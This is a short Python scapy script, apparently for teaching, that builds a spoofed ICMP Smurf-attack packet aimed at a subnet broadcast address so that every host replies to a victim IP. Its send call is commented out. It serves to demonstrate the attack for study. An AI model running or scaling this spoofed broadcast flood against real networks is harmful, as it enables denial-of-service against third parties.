from scapy.all import IP, ICMP, send

# 1. Define the roles
victim_ip = "192.168.1.50"      # The "Target" we want to overwhelm
broadcast_ip = "192.168.1.255"  # The "Amplifier" that talks to everyone

print(f"Constructing malicious Smurf packet...")
print(f"Spoofing Source IP as: {victim_ip}")
print(f"Sending to Broadcast: {broadcast_ip}")

# 2. Build the forged packet
# IP(src=...) is the spoofing part. We lie about where the packet came from.
packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

# 3. Explain the logic to the class:
# If we 'send' this once, the broadcast network sends it to 255 devices.
# All 255 devices will then reply to the 'src' (the Victim).
print("\nPacket Header Details:")
packet.show() 

# Uncomment the line below to send a single demonstration packet
# send(packet, count=1)